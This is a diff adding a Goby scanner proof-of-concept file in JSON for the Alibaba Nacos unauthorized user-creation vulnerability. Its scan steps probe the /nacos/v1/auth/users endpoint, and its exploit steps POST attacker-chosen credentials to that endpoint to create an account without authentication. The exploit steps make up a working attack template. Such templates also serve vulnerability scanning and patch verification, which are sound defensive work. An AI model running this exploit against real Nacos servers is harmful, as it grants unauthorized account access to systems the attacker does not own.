@@ -1,0 +1,126 @@
+{
+      "Name": "Alibaba Nacos Add user not authorized",
+      "Level": "2",
+      "Tags": [
+            "Ultra vires"
+      ],
+      "GobyQuery": "title==\"Nacos\"",
+      "Description": "On December 29, 2020, the Nacos official disclosed in the issue released by GitHub that there is an unauthorized access vulnerability in Alibaba Nacos due to improper handling of user agent. Through this vulnerability, the attacker can perform arbitrary operations, including creating a new user and performing post login operations.",
+      "Product": "Alibaba Nacos",
+      "Homepage": "https://github.com/alibaba/nacos",
+      "Author": "PeiQi",
+      "Impact": "<p>Through this vulnerability, the attacker can perform arbitrary operations, including creating a new user and performing post login operations.<br></p>",
+      "Recommandation": "<p>Upgrade version<br></p>",
+      "References": [
+            "http://wiki.peiqi.tech"
+      ],
+      "HasExp": true,
+	  "ExpParams": [
+		{
+			"name": "User",
+			"type": "input",
+			"value": "PeiQi",
+			"show": ""
+		},
+		{
+			"name": "Pass",
+			"type": "input",
+			"value": "PeiQi",
+			"show": ""
+		},
+		{
+			"name": "Dir",
+			"type": "select",
+			"value": "/v1/auth/users,/nacos/v1/auth/users",
+			"show": ""
+		}
+	  ],
+      "ScanSteps": [
+            "OR",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/nacos/v1/auth/users?",
+                        "follow_redirect": true,
+                        "header": {
+                              "Content-Type": "application/x-www-form-urlencoded"
+                        },
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "500",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            },
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/v1/auth/users?",
+                        "follow_redirect": true,
+                        "header": {
+                              "Content-Type": "application/x-www-form-urlencoded"
+                        },
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "500",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+	  "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "{{{Dir}}}",
+                        "follow_redirect": true,
+                        "header": {
+                              "Content-Type": "application/x-www-form-urlencoded"
+                        },
+                        "data_type": "text",
+                        "data": "username={{{User}}}&password={{{Pass}}}"
+                  },
+				  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+					"output|lastbody"
+				  ]
+            }
+      ],
+      "PostTime": "2021-04-04 19:56:49",
+      "GobyVersion": "1.8.255"
+}
